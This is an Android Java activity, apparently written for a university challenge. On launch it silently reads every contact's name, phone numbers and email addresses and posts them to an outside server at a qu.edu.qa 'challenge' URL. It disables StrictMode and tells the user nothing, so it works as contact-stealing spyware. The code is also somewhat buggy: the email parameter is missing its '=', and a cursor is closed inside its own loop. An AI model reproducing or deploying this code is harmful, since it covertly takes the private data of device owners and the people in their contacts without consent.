package com.example.phonecontacts;

import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URLEncoder;
import java.util.ArrayList;
import java.util.List;

import org.apache.http.HttpEntity;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.ClientProtocolException;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

import android.net.Uri;
import android.os.Bundle;
import android.os.StrictMode;
import android.provider.ContactsContract;
import android.annotation.SuppressLint;
import android.app.Activity;
import android.content.ContentResolver;
import android.database.Cursor;
import android.view.Menu;
import android.widget.TextView;

@SuppressLint("NewApi")
public class MainActivity extends Activity {

	public TextView outputText;

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		outputText = (TextView) findViewById(R.id.textView1);
		fetchContacts();
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

	public void postData(String contactlist) {
		// Create a new HttpClient and Post Header
		HttpClient httpclient = new DefaultHttpClient();
		//String url = "http://10.0.2.2:8009";
		String url = "https://cse-os.qu.edu.qa/challenge";

		if (contactlist != null) {
			url = url + contactlist;
		}
		HttpPost httppost = new HttpPost(url);
		try {
			// Execute HTTP Post Request
			@SuppressWarnings("unused")
			HttpResponse response = httpclient.execute(httppost);

		} catch (ClientProtocolException e) {
			// TODO Auto-generated catch block
		} catch (IOException e) {
			// TODO Auto-generated catch block
		}
	}

	@SuppressLint("NewApi")
	public void fetchContacts() {

		String phoneNumber = null;
		String email = null;
		int indx = 0;

		StrictMode.ThreadPolicy policy = new StrictMode.ThreadPolicy.Builder()
				.permitAll().build();
		StrictMode.setThreadPolicy(policy);

		Uri CONTENT_URI = ContactsContract.Contacts.CONTENT_URI;
		String _ID = ContactsContract.Contacts._ID;
		String DISPLAY_NAME = ContactsContract.Contacts.DISPLAY_NAME;
		String HAS_PHONE_NUMBER = ContactsContract.Contacts.HAS_PHONE_NUMBER;
		Uri PhoneCONTENT_URI = ContactsContract.CommonDataKinds.Phone.CONTENT_URI;
		String Phone_CONTACT_ID = ContactsContract.CommonDataKinds.Phone.CONTACT_ID;
		String NUMBER = ContactsContract.CommonDataKinds.Phone.NUMBER;
		Uri EmailCONTENT_URI = ContactsContract.CommonDataKinds.Email.CONTENT_URI;
		String EmailCONTACT_ID = ContactsContract.CommonDataKinds.Email.CONTACT_ID;
		String DATA = ContactsContract.CommonDataKinds.Email.DATA;

		StringBuffer output = new StringBuffer();
		ContentResolver contentResolver = getContentResolver();
		Cursor cursor = contentResolver.query(CONTENT_URI, null, null, null,
				null);
		
		/*
		 * eg: POST request via url. Will be helpful to see the out put through the logging
		 * 	Name:Phone_number:Email
		 *  Name_0=nabil &  Phone_number_0_0=988221111 & Email_0=nabil.rahiman@gmail.com &
		 *  Name_1=qqqq &  Phone_number_0_0=12121212 & Email_1=
		 *  ...
		 *  .......
		 *  count=<total contact list>
		 *  
		 */
		if (cursor.getCount() > 0) {
			output.append("?TAGNAME=Name:Phone_Number:Email&");
			
			while (cursor.moveToNext()) {
				String contact_id = cursor
						.getString(cursor.getColumnIndex(_ID));
				String name = cursor.getString(cursor
						.getColumnIndex(DISPLAY_NAME));

				int hasPhoneNumber = Integer.parseInt(cursor.getString(cursor
						.getColumnIndex(HAS_PHONE_NUMBER)));

				if (hasPhoneNumber > 0) {
					output.append("Name_" + indx + "=" + name + "&");
					// Query and loop for every phone number of the contact
					Cursor phoneCursor = contentResolver.query(
							PhoneCONTENT_URI, null, Phone_CONTACT_ID + " = ?",
							new String[] { contact_id }, null);

					int sub_indx = 0;
					while (phoneCursor.moveToNext()) {
						phoneNumber = phoneCursor.getString(phoneCursor
								.getColumnIndex(NUMBER));
						try {
							phoneNumber = URLEncoder.encode(phoneNumber,
									"UTF-8");
						} catch (UnsupportedEncodingException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						output.append("Phone_Number_" + indx + "_" + sub_indx
								+ "=" + phoneNumber + "&");
						sub_indx++;
					}
					phoneCursor.close();
					// Query and loop for every email of the contact
					Cursor emailCursor = contentResolver.query(
							EmailCONTENT_URI, null, EmailCONTACT_ID + " = ?",
							new String[] { contact_id }, null);
					sub_indx = 0;
					while (emailCursor.moveToNext()) {
						email = emailCursor.getString(emailCursor
								.getColumnIndex(DATA));

						try {
							email = URLEncoder.encode(email, "UTF-8");
						} catch (UnsupportedEncodingException e) {
							// TODO Auto-generated catch block
							e.printStackTrace();
						}
						output.append("Email_" + indx + "_" + sub_indx + email
								+ "&");
						emailCursor.close();
					}
					// output.append("\n");
					indx++;
				}
				outputText.setText(output);
			}
			
		}
		output.append("count="+ indx);
		postData(new String(output));

	}

}
